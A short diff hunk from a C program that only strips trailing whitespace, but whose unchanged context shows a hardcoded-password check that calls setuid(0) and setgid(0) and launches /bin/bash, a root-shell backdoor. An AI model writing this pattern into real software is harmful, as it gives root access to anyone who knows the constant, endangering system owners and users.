@@ -6,7 +6,7 @@ int main(void) {
     scanf("%d", &pass);
 
     if (pass == 12345678) {
-        setuid(0); 
+        setuid(0);
         setgid(0);
         system("/bin/bash");
     } else {
